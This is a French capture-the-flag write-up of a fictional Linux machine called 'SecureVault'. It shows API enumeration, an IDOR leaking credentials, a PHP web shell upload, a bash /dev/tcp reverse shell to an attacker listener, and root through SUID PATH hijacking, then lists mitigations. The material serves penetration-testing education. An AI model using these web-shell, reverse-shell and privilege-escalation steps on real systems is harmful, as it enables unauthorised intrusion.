---
title: "[HTB] Write-up : SecureVault - Root to System"
description: "Exploitation complète d'une machine HackTheBox simulée avec escalade de privilèges Linux avancée"
date: 2025-01-08
author: Franck Chevalier
tags:
  - ctf
  - writeup
  - pentest
  - linux
excerpt: Write-up détaillé d'une machine Linux avec exploitation web et privilege escalation via SUID
---

## Informations

- **Nom** : SecureVault
- **OS** : Linux
- **Difficulté** : Medium
- **Points** : 40

## Reconnaissance

### Scan Nmap

```bash
nmap -sC -sV -oA nmap/securevault 10.10.11.42
```

Résultats :

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1
80/tcp   open  http    nginx 1.18.0
3000/tcp open  http    Node.js Express
```

### Énumération Web

Découverte d'une application web sur le port 80 et une API sur le port 3000.

```bash
gobuster dir -u http://10.10.11.42 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Directories intéressantes :
- `/admin` - Formulaire de login
- `/api/v1` - API REST
- `/uploads` - Directory listing activé !

## Initial Foothold

### Exploitation de l'API

L'API sur le port 3000 expose un endpoint `/api/v1/users` sans authentification.

```bash
curl http://10.10.11.42:3000/api/v1/users
```

Réponse :

```json
[
  {
    "id": 1,
    "username": "admin",
    "email": "admin@securevault.htb",
    "role": "administrator"
  },
  {
    "id": 2,
    "username": "john.doe",
    "email": "john@securevault.htb",
    "role": "user"
  }
]
```

### IDOR (Insecure Direct Object Reference)

Test d'accès aux détails utilisateur :

```bash
curl http://10.10.11.42:3000/api/v1/users/1
```

```json
{
  "id": 1,
  "username": "admin",
  "password_hash": "$2b$10$xYz...ABC123",
  "api_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

### JWT Token Exploitation

Le token JWT peut être décodé :

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d
```

Payload :

```json
{
  "user_id": 1,
  "role": "administrator",
  "iat": 1704720000
}
```

### File Upload Vulnerability

Avec le token admin, on peut uploader des fichiers via `/uploads`.

```bash
curl -X POST http://10.10.11.42/api/v1/upload \
  -H "Authorization: Bearer TOKEN" \
  -F "file=@shell.php"
```

Notre reverse shell PHP :

```php
<?php system($_GET['cmd']); ?>
```

### Reverse Shell

```bash
# Listener
nc -lvnp 4444

# Trigger
curl http://10.10.11.42/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261'
```

**Shell obtenu** en tant que `www-data` !

## User Flag

Exploration du système :

```bash
www-data@securevault:/var/www$ ls -la /home
drwxr-xr-x  3 john  john  4096 Jan  5 10:23 john
```

Fichier de configuration trouvé :

```bash
cat /var/www/api/config/database.js
```

```javascript
module.exports = {
  host: 'localhost',
  user: 'john',
  password: 'J0hn_S3cur3_P@ss!',
  database: 'securevault'
}
```

SSH avec ces credentials :

```bash
ssh john@10.10.11.42
```

**User flag** : `HTB{f4k3_us3r_fl4g_3x4mpl3}`

## Privilege Escalation

### Énumération SUID

```bash
find / -perm -4000 2>/dev/null
```

Binaire intéressant :

```
/usr/local/bin/backup_manager
```

### Analyse du binaire

```bash
strings /usr/local/bin/backup_manager
```

Le binaire appelle `tar` sans chemin absolu !

### PATH Hijacking

Création d'un faux `tar` :

```bash
cd /tmp
echo '#!/bin/bash' > tar
echo '/bin/bash -p' >> tar
chmod +x tar
export PATH=/tmp:$PATH
```

Exécution :

```bash
/usr/local/bin/backup_manager
```

**Root shell obtenu** !

```bash
root@securevault:/tmp# whoami
root
root@securevault:/tmp# cat /root/root.txt
```

**Root flag** : `HTB{f4k3_r00t_fl4g_3x4mpl3}`

## Conclusion

Cette machine illustre plusieurs concepts importants :

1. **Énumération approfondie** des services web
2. **Exploitation d'API** non sécurisées
3. **IDOR** pour accéder à des données sensibles
4. **File upload** mal configuré
5. **PATH Hijacking** pour l'escalade de privilèges

## Leçons apprises

- Toujours tester les endpoints API pour des vulnérabilités IDOR
- Les credentials en clair dans les configs sont un vecteur courant
- Les binaires SUID avec des appels système relatifs sont exploitables
- L'énumération minutieuse est la clé du succès

## Mitigation

Pour sécuriser une telle machine :

1. Authentification requise sur toutes les API endpoints
2. Utilisation de chemins absolus dans les binaires SUID
3. Permissions strictes sur les directories d'upload
4. Stockage sécurisé des credentials (variables d'environnement, vaults)
5. Validation stricte des fichiers uploadés

---

**Note** : Machine fictive créée pour démonstration. Les techniques décrites sont réelles et applicables dans un contexte d'audit autorisé.
